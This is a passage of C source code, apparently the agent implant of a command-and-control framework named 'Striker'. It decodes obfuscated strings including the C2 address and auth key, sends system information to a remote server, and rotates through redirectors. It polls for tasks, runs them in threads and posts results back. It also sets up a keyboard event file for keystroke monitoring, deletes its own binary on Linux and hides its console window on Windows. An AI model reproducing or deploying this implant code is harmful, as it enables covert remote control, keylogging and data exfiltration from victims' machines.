    free_buffer(result_buff);
    free(tskw);
    #ifdef IS_LINUX
      pthread_exit(NULL);
    #endif
    return 0;
}

void start_session(){  
  
  queue *base_addrs = queue_init(100);
  obfs_decode(BASE_URL);
  queue_put(base_addrs, strdup(BASE_URL));
  obfs_decode(STRIKER_USER_AGENT);
  char strs[][50] = {
    "[OBFS_ENC]/tmp/", "[OBFS_ENC]Connection: close", "[OBFS_ENC]Content-Type: application/json",
    "[OBFS_ENC]/agent/init", "[OBFS_ENC]uid", "[OBFS_ENC]/agent/tasks/%s", "[OBFS_ENC]key", "[OBFS_ENC]delay", "[OBFS_ENC]redirectors"};
  for (int i = 0; i < 9; i++)
    obfs_decode(strs[i]);
  // Default session setup.
  session *striker = malloc(sizeof(session));
  striker->uid = malloc(AGENT_UID_SIZE);
  memset(striker->uid, 0, AGENT_UID_SIZE);
  obfs_decode(AUTH_KEY);
  striker->auth_key = malloc(strlen(AUTH_KEY) + 1);
  strncpy(striker->auth_key, AUTH_KEY, strlen(AUTH_KEY) + 1);
  striker->delay = atoi(DELAY);
  if (striker->delay == 0)
    striker->delay = 10;
  striker->abort = 0;
  #ifdef IS_LINUX
  striker->kbd_event_file = malloc(PATH_MAX);
  memset(striker->kbd_event_file, 0, PATH_MAX);
  strncpy(striker->kbd_event_file, obfs_decode(KEYMON_DEFAULT_KBD), PATH_MAX - 1);
  #endif
  char *tmp;
  buffer *body = create_buffer(0); // Dynamic buffer for receiving response body.
  int status_code;
  queue *tasks_queue = queue_init(MAX_TASKS_QUEUE); // All running tasks will be queued here
  queue *completed_tasks = queue_init(MAX_TASKS_QUEUE); // Completed tasks will be moved here before submission
  striker->tasks = tasks_queue; // We need to pass this around.

  // Connects to the C2 server.
  contact_base: ;
    cJSON *info = sysinfo();
    cJSON_AddItemToObject(info, strs[6], cJSON_CreateString(AUTH_KEY));
    cJSON_AddItemToObject(info, strs[7], cJSON_CreateNumber(striker->delay));
    unsigned char connected = 0, fresh_conn = 0;
    while (!(striker->abort || connected)){
      queue_seek(base_addrs, 0);
      while (!queue_exhausted(base_addrs)){
        strncpy(BASE_URL, queue_get(base_addrs), URL_SIZE);
        resize_buffer(body, 0);
        if (strlen(striker->uid) == 0){ // No agent ID. Create a fresh session.
          status_code = http_post(strs[3], info, body);
          fresh_conn = 1;
        }else{ // Try to resume the session by checking if the agent ID is valid for the server.
          char *url = malloc(64);
          char fmt[] = "[OBFS_ENC]/agent/ping/%s";
          snprintf(url, 64, obfs_decode(fmt), striker->uid);
          status_code = http_get(url, body);
          free(url);
          fresh_conn = 0;
        }
        if (status_code != 200){
          #ifdef STRIKER_DEBUG
          fprintf(stderr, "[-] Error calling home %s: %d\n", BASE_URL, status_code);
          #endif
          sleep(striker->delay);
          continue;
        }
        connected = 1;
        break;
      }
    }
    cJSON_Delete(info);

  if (!connected)
    goto end;

  if (fresh_conn){ 
    // Parse the configuration received from the server.
    char *config_str = buffer_to_string(body);
    cJSON *config = cJSON_Parse(config_str);
    #ifdef STRIKER_DEBUG
    printf("[*] Agent config: %s\n", config_str);
    #endif
    if (!config){
      #ifdef STRIKER_DEBUG
      const char *error = cJSON_GetErrorPtr();
      fprintf(stderr, "[-] Error parsing config: %s\n", error);
      #endif
      free(config_str);
      goto end;
    }
    // Extract agent ID.
    tmp = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, strs[4]));
    if (tmp == NULL){
      #ifdef STRIKER_DEBUG
      fprintf(stderr, "[-] No config received from server, exiting...\n");
      #endif
      cJSON_Delete(config);
      free(config_str);
      goto end;
    }
    strncpy(striker->uid, tmp, AGENT_UID_SIZE - 1);
    // Extract redirectors.
    // 1 - Delete all existing ones.
    queue_seek(base_addrs, 0);
    while (!queue_empty(base_addrs)){
      char *url = queue_remove(base_addrs, 0);
      free(url);
    }
    // 2 - Add the current base URL.
    queue_put(base_addrs, strdup(BASE_URL));
    // 3 - Load the other redirectors.
    cJSON *rds = cJSON_GetObjectItemCaseSensitive(config, strs[8]);
    size_t rds_count = cJSON_GetArraySize(rds);
    while (rds_count > 0){
      queue_put(base_addrs, strdup(cJSON_GetStringValue(cJSON_GetArrayItem(rds, 0))));
      cJSON_DeleteItemFromArray(rds, 0);
      rds_count--;
    }
    #ifdef STRIKER_DEBUG
      printf("[+] Servers count: %u\n", (unsigned int)base_addrs->count);
    #endif
    cJSON_Delete(config);
    free(config_str);
  }

  char *tasksURL = malloc(URL_SIZE);
  snprintf(tasksURL, URL_SIZE, strs[5], striker->uid);
  unsigned int contact_fails = 0;
  while (1){
    if (contact_fails >= MAX_CONTACT_FAILS){ // Switch to another server.
      #ifdef STRIKER_DEBUG
      fprintf(stderr, "[!] Max failed connection attempts reached. Switching server...\n");
      #endif
      free(tasksURL);
      // Switch
      goto contact_base;
    }
    queue_seek(completed_tasks, 0);
    unsigned long next_cb_time = (unsigned long)time(NULL) + striker->delay;
    while ((unsigned long)time(NULL) < next_cb_time){
      sleep(1); // We don't want to wait for the whole callback delay before sending task results. A 1 sec sleep also allow us to bundle results for mutliple tasks that finish quickly.
      queue_seek(tasks_queue, 0);
      for (int i = 0; i < tasks_queue->count; i++){
        task *tsk = queue_get(tasks_queue);
        if (tsk->completed){
          queue_put(completed_tasks, tsk);
          queue_remove(tasks_queue, i);
          queue_seek(tasks_queue, tasks_queue->pos - 1);
          i--;
        }
      }
      // Build and send results.
      queue_seek(completed_tasks, 0);
      if (completed_tasks->count > 0){
        #ifdef STRIKER_DEBUG
          printf("[+] Sending results for %u tasks\n", (unsigned int)completed_tasks->count);
        #endif
        cJSON *results = cJSON_CreateArray();
        while (!queue_exhausted(completed_tasks)){
          task *tsk = queue_get(completed_tasks);
          cJSON_AddItemToArray(results, tsk->result);
        }
        resize_buffer(body, 0);
        status_code = http_post(tasksURL, results, body);
        if (status_code != 200){
          #ifdef STRIKER_DEBUG
          fprintf(stderr, "[-] Error calling home: %d\n", status_code);
          #endif
          size_t count = cJSON_GetArraySize(results);
          while (count > 0){
            cJSON_DetachItemFromArray(results, count - 1);
            count--;
          }
          cJSON_Delete(results);
          contact_fails++;
          continue;          
        }
        queue_seek(completed_tasks, 0);
        while (!queue_exhausted(completed_tasks)){
          task *tsk = queue_get(completed_tasks);
          cJSON_DetachItemFromArray(results, completed_tasks->pos - 1); // To avoid double free when later calling the cJSON_Delete() with the `results` JSON after calling free_task()
          queue_remove(completed_tasks, completed_tasks->pos - 1);
          queue_seek(completed_tasks, completed_tasks->pos - 1);
          free_task(tsk);
        }
        cJSON_Delete(results);
      }
    }
    if (striker->abort) // End the session.
      break;
    // Fetch new tasks tasks.
    resize_buffer(body, 0);
    status_code = http_get(tasksURL, body);
    if (status_code != 200){
      #ifdef STRIKER_DEBUG
      fprintf(stderr, "[-] Error fetching tasks: %d\n", status_code);
      #endif
      contact_fails++;
      continue;
    }
    // Parse tasks and spawn execution threads.
    tmp = buffer_to_string(body);
    cJSON *tasksJSON = cJSON_Parse(tmp);
    size_t tasksLen = cJSON_GetArraySize(tasksJSON);
    cJSON *json = NULL;
    for (int i = 0; i < tasksLen; i++){
      json = cJSON_GetArrayItem(tasksJSON, i);
      task *tsk = parse_task(json);
      cJSON_DetachItemFromArray(tasksJSON, i);
      queue_put(tasks_queue, tsk);
      task_wrapper *tskw = malloc(sizeof(task_wrapper));
      tskw->striker = striker;
      tskw->tsk = tsk;
      #ifdef IS_LINUX
        pthread_t t;
        if (pthread_create(&t, NULL, task_executor, (void *)tskw)){
          #ifdef STRIKER_DEBUG
          fprintf(stderr, "[-] Error starting thread for task: %s\n", tsk->uid);
          #endif
          queue_remove(tasks_queue, tasks_queue->count - 1);
          free_task(tsk);
          free(tskw);
        }
      #else
        DWORD threadID;
        HANDLE tHandle = CreateThread(NULL, 0, task_executor, tskw, 0, &threadID);
        if (!tHandle){
          #ifdef STRIKER_DEBUG
          fprintf(stderr, "[-] Error starting thread for task: %s\n", tsk->uid);
          #endif
          queue_remove(tasks_queue, tasks_queue->count - 1);
          free_task(tsk);
          free(tskw);          
        }
      #endif
      i--;
      tasksLen--;
    }
    cJSON_Delete(tasksJSON);
    free(tmp);
  }
  free(tasksURL);

  end:
    queue_seek(tasks_queue, 0);
    while (!queue_exhausted(tasks_queue))
      free_task(queue_get(tasks_queue));
    queue_seek(completed_tasks, 0);
    while (!queue_exhausted(completed_tasks))
      free_task(queue_get(completed_tasks));
    queue_free(tasks_queue, 0);
    queue_free(completed_tasks, 0);
    free_buffer(body);
    queue_free(base_addrs, 1);
    cleanup_session(striker);
}

void cleanup_session(session *striker){

  free(striker->uid);
  free(striker->auth_key);
  #ifdef IS_LINUX
  free(striker->kbd_event_file);
  #endif
  free(striker);
}

int main(int argc, char **argv){
  
  #ifdef STRIKER_DEBUG
  printf("[*] Starting Striker...\n");
  #endif
  #ifdef IS_LINUX
  remove(argv[0]);
  curl_global_init(CURL_GLOBAL_ALL);
  start_session();
  curl_global_cleanup();
  #else
  HWND hWnd = GetConsoleWindow();
  ShowWindow(hWnd, SW_MINIMIZE);
  ShowWindow(hWnd, SW_HIDE);
  start_session();
  #endif
  return 0;
}
